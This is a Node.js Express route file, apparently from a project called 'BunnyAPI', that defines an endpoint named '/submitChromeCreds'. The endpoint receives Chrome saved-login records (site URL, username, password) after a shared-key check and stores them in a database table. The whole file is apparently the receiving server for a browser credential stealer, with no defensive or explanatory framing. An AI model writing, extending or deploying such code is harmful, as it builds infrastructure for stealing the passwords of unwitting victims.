#!/usr/bin/env node
/* ---- BunnyAPI ----
* @Author: Daniel W. Anner
*/
/* express needs to be defined first */
const express = require('express');

/* set our constants */
const router = express.Router();
const fs = require('fs');
const log = require('../bin/loggers/logger-chrome');

/* set the post path and set the logic */
router.post('/submitChromeCreds', function(req, res, next) {
  /* define our data array for the sanatized data */
  let dataArray = [];
  /* push all JSON items to the sanatized array */
  Object.entries(req.body).forEach(function(el) {
    dataArray.push(el[1]);
  });

  /* check if the DB Secret key matches */
  if (dataArray.shift().value == dbSecret) {
    /* create a random timestamp for our data */
    let ranStamp = Math.floor(Date.now() + Math.random());
    dataArray.forEach(function(el) {
      let query = 'INSERT INTO chrome_data (dataset, chrome_url, chrome_user, chrome_pw) VALUES (?, ?, ?, ?)';

      /* insert the data sanatized to prevent sql injection */
      db.query(query, [ranStamp, el.signon_realm, el.username_value, el.password_value], function(err, status) {
        if (err) return next(err);
      });
    });

    log.info("Added data to table", dataArray);
    res.sendStatus(200); // return a 200 status code
  } else {
    log.warn("Invaid key!");
    res.sendStatus(403); // return access denied (403)
  }
});

/* Export the router */
module.exports = router;

